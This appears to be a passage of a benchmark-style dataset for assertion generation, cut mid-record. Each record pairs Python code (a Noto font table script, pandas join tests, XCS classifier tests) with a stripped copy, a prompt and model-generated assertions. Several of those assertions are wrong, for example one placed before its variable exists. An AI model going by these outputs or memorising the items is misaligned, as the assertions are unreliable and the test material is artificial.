      if script not in noto_fonts.script_key_to_scripts(
          family.rep_member.script):
        continue

      found_font = True
      members = family.hinted_members or family.unhinted_members
      ui_members = [m for m in members if m.is_UI]
      non_ui_members = [m for m in members if not m.is_UI]
      assert len(ui_members) <= 1
      assert len(non_ui_members) <= 1
      write_csv(outfile, lang, script, family.rep_member.style, '',
                non_ui_members)
      write_csv(outfile, lang, script, family.rep_member.style, 'UI',
                ui_members)

    if not found_font:
      print '## no font found for lang %s' % lang
","
1#!/usr/bin/env python
2#
3# Copyright 2015 Google Inc. All rights reserved.
4#
5# Licensed under the Apache License, Version 2.0 (the ""License"");
6# you may not use this file except in compliance with the License.
7# You may obtain a copy of the License at
8#
9#     http://www.apache.org/licenses/LICENSE-2.0
10#
11# Unless required by applicable law or agreed to in writing, software
12# distributed under the License is distributed on an ""AS IS"" BASIS,
13# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
14# See the License for the specific language governing permissions and
15# limitations under the License.
16
17""""""
18Generate a csv with the following columns:
19- bcp-47 language code (minimal)
20- script (most likely script for the code)
21- style name (Serif, Sans, Naskh...)
22- ui status (UI, <empty>)
23- font name
24
25This will start with a canned list of languages for now. We could 
26generate a more comprehensive list from our data.
27""""""
28
29import collections
30
31import os
32from os import path
33
34from nototools import cldr_data
35from nototools import noto_fonts
36
37LANGS = (
38    'af,am,ar,az,bg,bn,bs,ca,cs,da,de,el,en,en-US,es,es-419,et,eu,fa,fi,'
39    'fil,fr,gl,gu,hi,hr,hu,hy,id,is,it,iw,ja,ka,kk,km,kn,ko,ky,lo,lt,lv,'
40    'mk,ml,mn,mr,ms,my,ne,nl,no,pa,pl,pt-BR,pt-PT,ro,ru,si,sk,sl,sq,sr,'
41    'sv,sw,ta,te,th,tl,tr,uk,ur,uz,vi,zh-CN,zh-TW,zu').split(',')
42
43def accept_font(f):
44  return (
45      f.family == 'Noto' and  # exclude Arimo, Tinos, Cousine
46      f.style != 'Nastaliq' and  # exclude Nastaliq, not suitable for maps
47      f.script != 'HST' and  # exclude Historic, tool limitation
48      f.weight == 'Regular' and  # to limit members of fonts
49      f.width == 'Regular' and  # to limit members of fonts, we don't
50      not f.slope and            #   care about weights
51      f.fmt in ['ttf', 'otf'] and  # only support these formats
52      (not f.is_cjk or f.subset))  # 'small' language-specific CJK subsets
53
54fonts = filter(accept_font, noto_fonts.get_noto_fonts())
55families = noto_fonts.get_families(fonts).values()
56
57def write_csv_header(outfile):
58  print >> outfile, 'Code,Script,Style,UI,Font Name'
59
60
61def write_csv(outfile, lang, script, style, ui, members):
62  if members:
63    print >> outfile, ','.join(
64        [lang, script, style, ui,
65         noto_fonts.get_font_family_name(members[0].filepath)])
66
67
68with open('lang_to_font_table.csv', 'w') as outfile:
69  write_csv_header(outfile)
70  for lang in LANGS:
71    script = cldr_data.get_likely_script(lang)
72    found_font = False
73    for family in sorted(families, key=lambda f: f.name):
74      if script not in noto_fonts.script_key_to_scripts(
75          family.rep_member.script):
76        continue
77
78      found_font = True
79      members = family.hinted_members or family.unhinted_members
80      ui_members = [m for m in members if m.is_UI]
81      non_ui_members = [m for m in members if not m.is_UI]
82      write_csv(outfile, lang, script, family.rep_member.style, '',
83                non_ui_members)
84      write_csv(outfile, lang, script, family.rep_member.style, 'UI',
85                ui_members)
86
87    if not found_font:
88      print '## no font found for lang %s' % lang
89","[['len(ui_members)', '<=', '1'], ['len(non_ui_members)', '<=', '1']]",2,2,1.0,0.000624804748516,"['LANGS', 'f', 'fonts', 'families', 'outfile', 'lang', 'script', 'style', 'ui', 'members', 'found_font', 'ui_members', 'non_ui_members']",13,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['LANGS', 'f', 'fonts', 'families', 'outfile', 'lang', 'script', 'style', 'ui', 'members', 'found_font', 'ui_members', 'non_ui_members']
*Code:

1#!/usr/bin/env python
2#
3# Copyright 2015 Google Inc. All rights reserved.
4#
5# Licensed under the Apache License, Version 2.0 (the ""License"");
6# you may not use this file except in compliance with the License.
7# You may obtain a copy of the License at
8#
9#     http://www.apache.org/licenses/LICENSE-2.0
10#
11# Unless required by applicable law or agreed to in writing, software
12# distributed under the License is distributed on an ""AS IS"" BASIS,
13# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
14# See the License for the specific language governing permissions and
15# limitations under the License.
16
17""""""
18Generate a csv with the following columns:
19- bcp-47 language code (minimal)
20- script (most likely script for the code)
21- style name (Serif, Sans, Naskh...)
22- ui status (UI, <empty>)
23- font name
24
25This will start with a canned list of languages for now. We could 
26generate a more comprehensive list from our data.
27""""""
28
29import collections
30
31import os
32from os import path
33
34from nototools import cldr_data
35from nototools import noto_fonts
36
37LANGS = (
38    'af,am,ar,az,bg,bn,bs,ca,cs,da,de,el,en,en-US,es,es-419,et,eu,fa,fi,'
39    'fil,fr,gl,gu,hi,hr,hu,hy,id,is,it,iw,ja,ka,kk,km,kn,ko,ky,lo,lt,lv,'
40    'mk,ml,mn,mr,ms,my,ne,nl,no,pa,pl,pt-BR,pt-PT,ro,ru,si,sk,sl,sq,sr,'
41    'sv,sw,ta,te,th,tl,tr,uk,ur,uz,vi,zh-CN,zh-TW,zu').split(',')
42
43def accept_font(f):
44  return (
45      f.family == 'Noto' and  # exclude Arimo, Tinos, Cousine
46      f.style != 'Nastaliq' and  # exclude Nastaliq, not suitable for maps
47      f.script != 'HST' and  # exclude Historic, tool limitation
48      f.weight == 'Regular' and  # to limit members of fonts
49      f.width == 'Regular' and  # to limit members of fonts, we don't
50      not f.slope and            #   care about weights
51      f.fmt in ['ttf', 'otf'] and  # only support these formats
52      (not f.is_cjk or f.subset))  # 'small' language-specific CJK subsets
53
54fonts = filter(accept_font, noto_fonts.get_noto_fonts())
55families = noto_fonts.get_families(fonts).values()
56
57def write_csv_header(outfile):
58  print >> outfile, 'Code,Script,Style,UI,Font Name'
59
60
61def write_csv(outfile, lang, script, style, ui, members):
62  if members:
63    print >> outfile, ','.join(
64        [lang, script, style, ui,
65         noto_fonts.get_font_family_name(members[0].filepath)])
66
67
68with open('lang_to_font_table.csv', 'w') as outfile:
69  write_csv_header(outfile)
70  for lang in LANGS:
71    script = cldr_data.get_likely_script(lang)
72    found_font = False
73    for family in sorted(families, key=lambda f: f.name):
74      if script not in noto_fonts.script_key_to_scripts(
75          family.rep_member.script):
76        continue
77
78      found_font = True
79      members = family.hinted_members or family.unhinted_members
80      ui_members = [m for m in members if m.is_UI]
81      non_ui_members = [m for m in members if not m.is_UI]
82      write_csv(outfile, lang, script, family.rep_member.style, '',
83                non_ui_members)
84      write_csv(outfile, lang, script, family.rep_member.style, 'UI',
85                ui_members)
86
87    if not found_font:
88      print '## no font found for lang %s' % lang
89",4815,"[37, LANGS, !=, '', ""LANGS should not be an empty string""],
[42, f, !=, None, ""Function accept_font should exist""],
[53, fonts, !=, [], ""Fonts should not be an empty list""],
[54, families, !=, [], ""Families should not be an empty list""],
[61, outfile, !=, None, ""outfile should not be None""],
[61, lang, !=, '', ""lang should not be an empty string""],
[61, script, !=, '', ""script should not be an empty string""],
[61, style, !=, '', ""style should not be an empty string""],
[61, ui, !=, '', ""ui should not be an empty string""],
[61, members, !=, [], ""members should not be an empty list""],
[67, found_font, ==, True, ""A font should be found for every language in LANGS""],
[79, members, !=, [], ""members should not be an empty list""],
[80, ui_members, !=, [], ""ui_members should not be an empty list""],
[81, non_ui_members, !=, [], ""non_ui_members should not be an empty list""]"
gfyoung/pandas,"import numpy as np
import pytest

from pandas._libs.tslibs import IncompatibleFrequency

from pandas import (
    Index,
    PeriodIndex,
    period_range,
)
import pandas._testing as tm


class TestJoin:
    def test_join_outer_indexer(self):
        pi = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")

        result = pi._outer_indexer(pi)
        tm.assert_extension_array_equal(result[0], pi._values)
        tm.assert_numpy_array_equal(result[1], np.arange(len(pi), dtype=np.intp))
        tm.assert_numpy_array_equal(result[2], np.arange(len(pi), dtype=np.intp))

    def test_joins(self, join_type):
        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")

        joined = index.join(index[:-5], how=join_type)

        assert isinstance(joined, PeriodIndex)
        assert joined.freq == index.freq

    def test_join_self(self, join_type):
        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")

        res = index.join(index, how=join_type)
        assert index is res

    def test_join_does_not_recur(self):
        df = tm.makeCustomDataframe(
            3,
            2,
            data_gen_f=lambda *args: np.random.randint(2),
            c_idx_type=""p"",
            r_idx_type=""dt"",
        )
        s = df.iloc[:2, 0]

        res = s.index.join(df.columns, how=""outer"")
        expected = Index([s.index[0], s.index[1], df.columns[0], df.columns[1]], object)
        tm.assert_index_equal(res, expected)

    def test_join_mismatched_freq_raises(self):
        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")
        index3 = period_range(""1/1/2000"", ""1/20/2000"", freq=""2D"")
        msg = r"".*Input has different freq=2D from Period\(freq=D\)""
        with pytest.raises(IncompatibleFrequency, match=msg):
            index.join(index3)
","
1import numpy as np
2import pytest
3
4from pandas._libs.tslibs import IncompatibleFrequency
5
6from pandas import (
7    Index,
8    PeriodIndex,
9    period_range,
10)
11import pandas._testing as tm
12
13
14class TestJoin:
15    def test_join_outer_indexer(self):
16        pi = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")
17
18        result = pi._outer_indexer(pi)
19
20    def test_joins(self, join_type):
21        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")
22
23        joined = index.join(index[:-5], how=join_type)
24
25
26    def test_join_self(self, join_type):
27        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")
28
29        res = index.join(index, how=join_type)
30
31    def test_join_does_not_recur(self):
32        df = tm.makeCustomDataframe(
33            3,
34            2,
35            data_gen_f=lambda *args: np.random.randint(2),
36            c_idx_type=""p"",
37            r_idx_type=""dt"",
38        )
39        s = df.iloc[:2, 0]
40
41        res = s.index.join(df.columns, how=""outer"")
42        expected = Index([s.index[0], s.index[1], df.columns[0], df.columns[1]], object)
43
44    def test_join_mismatched_freq_raises(self):
45        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")
46        index3 = period_range(""1/1/2000"", ""1/20/2000"", freq=""2D"")
47        msg = r"".*Input has different freq=2D from Period\(freq=D\)""
48        with pytest.raises(IncompatibleFrequency, match=msg):
49            index.join(index3)
50","[['joined.freq', '==', 'index.freq'], ['index', '==', 'res']]",7,2,0.2857142857142857,0.0011173184357541,"['pi', 'result', 'join_type', 'index', 'joined', 'res', 'df', 's', 'expected', 'index3', 'msg']",11,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['pi', 'result', 'join_type', 'index', 'joined', 'res', 'df', 's', 'expected', 'index3', 'msg']
*Code:

1import numpy as np
2import pytest
3
4from pandas._libs.tslibs import IncompatibleFrequency
5
6from pandas import (
7    Index,
8    PeriodIndex,
9    period_range,
10)
11import pandas._testing as tm
12
13
14class TestJoin:
15    def test_join_outer_indexer(self):
16        pi = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")
17
18        result = pi._outer_indexer(pi)
19
20    def test_joins(self, join_type):
21        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")
22
23        joined = index.join(index[:-5], how=join_type)
24
25
26    def test_join_self(self, join_type):
27        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")
28
29        res = index.join(index, how=join_type)
30
31    def test_join_does_not_recur(self):
32        df = tm.makeCustomDataframe(
33            3,
34            2,
35            data_gen_f=lambda *args: np.random.randint(2),
36            c_idx_type=""p"",
37            r_idx_type=""dt"",
38        )
39        s = df.iloc[:2, 0]
40
41        res = s.index.join(df.columns, how=""outer"")
42        expected = Index([s.index[0], s.index[1], df.columns[0], df.columns[1]], object)
43
44    def test_join_mismatched_freq_raises(self):
45        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")
46        index3 = period_range(""1/1/2000"", ""1/20/2000"", freq=""2D"")
47        msg = r"".*Input has different freq=2D from Period\(freq=D\)""
48        with pytest.raises(IncompatibleFrequency, match=msg):
49            index.join(index3)
50",2969,"[[16, 'pi', '!=', None, 'ensure that period_range returns a non-null object'],
 [18, 'result', '!=', None, 'ensure that _outer_indexer function returns a non-null object'],
 [21, 'index', '!=', None, 'ensure that period_range returns a non-null object'],
 [23, 'joined', '!=', None, 'ensure that join operation returns a non-null object'],
 [27, 'index', '!=', None, 'ensure that period_range returns a non-null object'],
 [29, 'res', '!=', None, 'ensure that join operation returns a non-null object'],
 [39, 's', '!=', None, 'ensure that iloc operation returns a non-null object'],
 [41, 'res', '!=', None, 'ensure that join operation returns a non-null object'],
 [42, 'expected', '!=', None, 'ensure that Index operation returns a non-null object'],
 [45, 'index', '!=', None, 'ensure that period_range returns a non-null object'],
 [46, 'index3', '!=', None, 'ensure that period_range returns a non-null object']]"
khozzy/pyalcs,"import pytest

from copy import copy
from lcs import Perception
from lcs.agents.xcs import Configuration, Condition, Classifier, ClassifiersList


class TestClassifiersList:

    @pytest.fixture
    def cfg(self):
        return Configuration(number_of_actions=4)

    @pytest.fixture
    def situation(self):
        return ""1100""

    @pytest.fixture
    def classifiers_list_diff_actions(self, cfg, situation):
        classifiers_list = ClassifiersList(cfg)
        classifiers_list.insert_in_population(Classifier(cfg, Condition(situation), 0, 0))
        classifiers_list.insert_in_population(Classifier(cfg, Condition(situation), 1, 0))
        classifiers_list.insert_in_population(Classifier(cfg, Condition(situation), 2, 0))
        classifiers_list.insert_in_population(Classifier(cfg, Condition(situation), 3, 0))
        return classifiers_list

    def test_init(self, cfg):
        assert len(ClassifiersList(cfg)) == 0

    @pytest.mark.parametrize(""cond, act"", [
        (""1100"", 0),
        (""1100"", 1),
        (""1100"", 2),
        (""1100"", 3)
    ])
    def test_insert_population(self, classifiers_list_diff_actions, cfg, cond, act):
        cl = Classifier(cfg=cfg, condition=Condition(""1111""), action=0, time_stamp=0)
        classifiers_list_diff_actions.insert_in_population(cl)
        assert any(c == cl for c in classifiers_list_diff_actions)

    @pytest.mark.parametrize(""cond, act"", [
        (""1111"", 0),
        (""123"", 1),
        (""A"", 2),
        (""##11"", 0),
        (""#11#"", 0),
        (""112"", 0),
    ])
    def test_insert_population_new_condition(self, classifiers_list_diff_actions, cfg, cond, act):
        cl = Classifier(cfg=cfg, condition=Condition(""1111""), action=0, time_stamp=0)
        classifiers_list_diff_actions.insert_in_population(cl)
        for c in classifiers_list_diff_actions:
            assert c.numerosity == 1
        assert classifiers_list_diff_actions[4] == cl

    def test_covering(self, cfg):
        classifiers_list = ClassifiersList(cfg)
        covering_cl = classifiers_list.generate_covering_classifier(Perception(""1111""), 0, 0)
        assert covering_cl.does_match(Perception(""1111""))
        assert classifiers_list.generate_covering_classifier(""1111"", 0, 0).action == 0

    def test_deletion(self, cfg: Configuration):
        classifiers_list = ClassifiersList(cfg)
        for i in range(cfg.max_population + 1):
            classifiers_list.insert_in_population(
                Classifier(cfg, Condition(""1111""), 0, 0)
            )
        assert sum(cl.numerosity for cl in classifiers_list) > cfg.max_population
        classifiers_list.delete_from_population()
        assert sum(cl.numerosity for cl in classifiers_list) <= cfg.max_population

    def test_removes_correct_one(self, cfg):
        classifiers_list = ClassifiersList(cfg)
        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1111""), 0, 0))
        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1110""), 1, 0))
        classifiers_list.insert_in_population(Classifier(cfg, Condition(""0000""), 0, 0))
        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1100""), 2, 0))
        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1000""), 3, 0))
        deletion_votes = []
        for _ in range(len(classifiers_list)):
            deletion_votes.append(1)
        selector = sum(deletion_votes) / 2
        classifiers_list._remove_based_on_votes(deletion_votes, selector)
        assert not any(cl.does_match(""0000"") for cl in classifiers_list)
        assert len(classifiers_list) == 4

    def test_match_set(self, classifiers_list_diff_actions):
        assert len(classifiers_list_diff_actions.generate_match_set(Perception(""1100""), 1)) == 4
        match_set = classifiers_list_diff_actions.generate_match_set(Perception(""1111""), 1)
        assert len(match_set) == 4
        assert len(classifiers_list_diff_actions) == 8

    def test_action_set(self, cfg, classifiers_list_diff_actions):
        action_set = classifiers_list_diff_actions.generate_action_set(0)
        assert len(action_set) == 1
        assert action_set[0].action == 0
        action_set[0].action = 1
        assert classifiers_list_diff_actions[0].action == 1

    def test_find_not_present_action(self, cfg):
        classifiers_list = ClassifiersList(cfg)
        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1100""), 1, 0))
        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1100""), 2, 0))
        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1100""), 3, 0))
        assert 0 == classifiers_list._find_not_present_action(classifiers_list)

    def test_prediction_array(self, cfg, classifiers_list_diff_actions):
        classifiers_list_diff_actions[0].prediction = 10
        prediction_array = classifiers_list_diff_actions.prediction_array
        assert len(classifiers_list_diff_actions) == cfg.number_of_actions
        assert prediction_array[0] > prediction_array[1]

    def test_update_fitness(self, cfg, classifiers_list_diff_actions):
        classifiers_list_diff_actions._update_fitness()
        for cl in classifiers_list_diff_actions:
            assert cl.fitness != cfg.initial_fitness

    def test_update_set(self, cfg: Configuration, classifiers_list_diff_actions):
        cfg.do_GA_subsumption = True
        cl = copy(classifiers_list_diff_actions[0])
        cfg.learning_rate = 1
        classifiers_list_diff_actions.update_set(0.2)
        for c in classifiers_list_diff_actions:
            assert c.experience > 0
            assert c.prediction != cl.prediction
            assert c.error != cl.error
","
1import pytest
2
3from copy import copy
4from lcs import Perception
5from lcs.agents.xcs import Configuration, Condition, Classifier, ClassifiersList
6
7
8class TestClassifiersList:
9
10    @pytest.fixture
11    def cfg(self):
12        return Configuration(number_of_actions=4)
13
14    @pytest.fixture
15    def situation(self):
16        return ""1100""
17
18    @pytest.fixture
19    def classifiers_list_diff_actions(self, cfg, situation):
20        classifiers_list = ClassifiersList(cfg)
21        classifiers_list.insert_in_population(Classifier(cfg, Condition(situation), 0, 0))
22        classifiers_list.insert_in_population(Classifier(cfg, Condition(situation), 1, 0))
23        classifiers_list.insert_in_population(Classifier(cfg, Condition(situation), 2, 0))
24        classifiers_list.insert_in_population(Classifier(cfg, Condition(situation), 3, 0))
25        return classifiers_list
26
27    def test_init(self, cfg):
28
29    @pytest.mark.parametrize(""cond, act"", [
30        (""1100"", 0),
31        (""1100"", 1),
32        (""1100"", 2),
33        (""1100"", 3)
34    ])
35    def test_insert_population(self, classifiers_list_diff_actions, cfg, cond, act):
36        cl = Classifier(cfg=cfg, condition=Condition(""1111""), action=0, time_stamp=0)
37        classifiers_list_diff_actions.insert_in_population(cl)
38
39    @pytest.mark.parametrize(""cond, act"", [
40        (""1111"", 0),
41        (""123"", 1),
42        (""A"", 2),
43        (""##11"", 0),
44        (""#11#"", 0),
45        (""112"", 0),
46    ])
47    def test_insert_population_new_condition(self, classifiers_list_diff_actions, cfg, cond, act):
48        cl = Classifier(cfg=cfg, condition=Condition(""1111""), action=0, time_stamp=0)
49        classifiers_list_diff_actions.insert_in_population(cl)
50        for c in classifiers_list_diff_actions:
51
52    def test_covering(self, cfg):
53        classifiers_list = ClassifiersList(cfg)
54        covering_cl = classifiers_list.generate_covering_classifier(Perception(""1111""), 0, 0)
55
56    def test_deletion(self, cfg: Configuration):
57        classifiers_list = ClassifiersList(cfg)
58        for i in range(cfg.max_population + 1):
59            classifiers_list.insert_in_population(
60                Classifier(cfg, Condition(""1111""), 0, 0)
61            )
62        classifiers_list.delete_from_population()
63
64    def test_removes_correct_one(self, cfg):
65        classifiers_list = ClassifiersList(cfg)
66        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1111""), 0, 0))
67        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1110""), 1, 0))
68        classifiers_list.insert_in_population(Classifier(cfg, Condition(""0000""), 0, 0))
69        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1100""), 2, 0))
70        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1000""), 3, 0))
71        deletion_votes = []
72        for _ in range(len(classifiers_list)):
73            deletion_votes.append(1)
74        selector = sum(deletion_votes) / 2
75        classifiers_list._remove_based_on_votes(deletion_votes, selector)
76
77    def test_match_set(self, classifiers_list_diff_actions):
78        match_set = classifiers_list_diff_actions.generate_match_set(Perception(""1111""), 1)
79
80    def test_action_set(self, cfg, classifiers_list_diff_actions):
81        action_set = classifiers_list_diff_actions.generate_action_set(0)
82        action_set[0].action = 1
83
84    def test_find_not_present_action(self, cfg):
85        classifiers_list = ClassifiersList(cfg)
86        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1100""), 1, 0))
87        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1100""), 2, 0))
88        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1100""), 3, 0))
89
90    def test_prediction_array(self, cfg, classifiers_list_diff_actions):
91        classifiers_list_diff_actions[0].prediction = 10
92        prediction_array = classifiers_list_diff_actions.prediction_array
93
94    def test_update_fitness(self, cfg, classifiers_list_diff_actions):
95        classifiers_list_diff_actions._update_fitness()
96        for cl in classifiers_list_diff_actions:
97
98    def test_update_set(self, cfg: Configuration, classifiers_list_diff_actions):
99        cfg.do_GA_subsumption = True
100        cl = copy(classifiers_list_diff_actions[0])
101        cfg.learning_rate = 1
102        classifiers_list_diff_actions.update_set(0.2)
103        for c in classifiers_list_diff_actions:
104","[['len(ClassifiersList(cfg))', '==', '0'], ['c.numerosity', '==', '1'], ['classifiers_list_diff_actions[4]', '==', 'cl'], ['covering_cl.does_match(Perception(""1111""))', '==', 'True'], ['classifiers_list.generate_covering_classifier(""1111""', '==', 'True'], ['len(classifiers_list)', '==', '4'], ['len(classifiers_list_diff_actions.generate_match_set(Perception(""1100"")', '==', 'True'], ['len(match_set)', '==', '4'], ['len(classifiers_list_diff_actions)', '==', '8'], ['len(action_set)', '==', '1'], ['action_set[0].action', '==', '0'], ['classifiers_list_diff_actions[0].action', '==', '1'], ['0', '==', 'classifiers_list._find_not_present_action(classifiers_list)'], ['len(classifiers_list_diff_actions)', '==', 'cfg.number_of_actions'], ['prediction_array[0]', '>', 'prediction_array[1]'], ['cl.fitness', '!=', 'cfg.initial_fitness'], ['c.experience', '>', '0'], ['c.prediction', '!=', 'cl.prediction'], ['c.error', '!=', 'cl.error']]",23,19,0.8260869565217391,0.0033309957924263,"['cfg', 'situation', 'classifiers_list', 'classifiers_list_diff_actions', 'cond', 'act', 'cl', 'covering_cl', 'cfg: Configuration', 'deletion_votes', 'selector', 'match_set', 'action_set', 'action_set[0].action', 'classifiers_list_diff_actions[0].prediction', 'prediction_array', 'cfg.do_GA_subsumption', 'cfg.learning_rate']",18,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['cfg', 'situation', 'classifiers_list', 'classifiers_list_diff_actions', 'cond', 'act', 'cl', 'covering_cl', 'cfg: Configuration', 'deletion_votes', 'selector', 'match_set', 'action_set', 'action_set[0].action', 'classifiers_list_diff_actions[0].prediction', 'prediction_array', 'cfg.do_GA_subsumption', 'cfg.learning_rate']
*Code:

1import pytest
2
3from copy import copy
4from lcs import Perception
5from lcs.agents.xcs import Configuration, Condition, Classifier, ClassifiersList
6
7
8class TestClassifiersList:
9
10    @pytest.fixture
11    def cfg(self):
12        return Configuration(number_of_actions=4)
13
14    @pytest.fixture
15    def situation(self):
16        return ""1100""
17
18    @pytest.fixture
19    def classifiers_list_diff_actions(self, cfg, situation):
20        classifiers_list = ClassifiersList(cfg)
21        classifiers_list.insert_in_population(Classifier(cfg, Condition(situation), 0, 0))
22        classifiers_list.insert_in_population(Classifier(cfg, Condition(situation), 1, 0))
23        classifiers_list.insert_in_population(Classifier(cfg, Condition(situation), 2, 0))
24        classifiers_list.insert_in_population(Classifier(cfg, Condition(situation), 3, 0))
25        return classifiers_list
26
27    def test_init(self, cfg):
28
29    @pytest.mark.parametrize(""cond, act"", [
30        (""1100"", 0),
31        (""1100"", 1),
32        (""1100"", 2),
33        (""1100"", 3)
34    ])
35    def test_insert_population(self, classifiers_list_diff_actions, cfg, cond, act):
36        cl = Classifier(cfg=cfg, condition=Condition(""1111""), action=0, time_stamp=0)
37        classifiers_list_diff_actions.insert_in_population(cl)
38
39    @pytest.mark.parametrize(""cond, act"", [
40        (""1111"", 0),
41        (""123"", 1),
42        (""A"", 2),
43        (""##11"", 0),
44        (""#11#"", 0),
45        (""112"", 0),
46    ])
47    def test_insert_population_new_condition(self, classifiers_list_diff_actions, cfg, cond, act):
48        cl = Classifier(cfg=cfg, condition=Condition(""1111""), action=0, time_stamp=0)
49        classifiers_list_diff_actions.insert_in_population(cl)
50        for c in classifiers_list_diff_actions:
51
52    def test_covering(self, cfg):
53        classifiers_list = ClassifiersList(cfg)
54        covering_cl = classifiers_list.generate_covering_classifier(Perception(""1111""), 0, 0)
55
56    def test_deletion(self, cfg: Configuration):
57        classifiers_list = ClassifiersList(cfg)
58        for i in range(cfg.max_population + 1):
59            classifiers_list.insert_in_population(
60                Classifier(cfg, Condition(""1111""), 0, 0)
61            )
62        classifiers_list.delete_from_population()
63
64    def test_removes_correct_one(self, cfg):
65        classifiers_list = ClassifiersList(cfg)
66        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1111""), 0, 0))
67        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1110""), 1, 0))
68        classifiers_list.insert_in_population(Classifier(cfg, Condition(""0000""), 0, 0))
69        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1100""), 2, 0))
70        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1000""), 3, 0))
71        deletion_votes = []
72        for _ in range(len(classifiers_list)):
73            deletion_votes.append(1)
74        selector = sum(deletion_votes) / 2
75        classifiers_list._remove_based_on_votes(deletion_votes, selector)
76
77    def test_match_set(self, classifiers_list_diff_actions):
78        match_set = classifiers_list_diff_actions.generate_match_set(Perception(""1111""), 1)
79
80    def test_action_set(self, cfg, classifiers_list_diff_actions):
81        action_set = classifiers_list_diff_actions.generate_action_set(0)
82        action_set[0].action = 1
83
84    def test_find_not_present_action(self, cfg):
85        classifiers_list = ClassifiersList(cfg)
86        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1100""), 1, 0))
87        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1100""), 2, 0))
88        classifiers_list.insert_in_population(Classifier(cfg, Condition(""1100""), 3, 0))
89
90    def test_prediction_array(self, cfg, classifiers_list_diff_actions):
91        classifiers_list_diff_actions[0].prediction = 10
92        prediction_array = classifiers_list_diff_actions.prediction_array
93
94    def test_update_fitness(self, cfg, classifiers_list_diff_actions):
95        classifiers_list_diff_actions._update_fitness()
96        for cl in classifiers_list_diff_actions:
97
98    def test_update_set(self, cfg: Configuration, classifiers_list_diff_actions):
99        cfg.do_GA_subsumption = True
100        cl = copy(classifiers_list_diff_actions[0])
101        cfg.learning_rate = 1
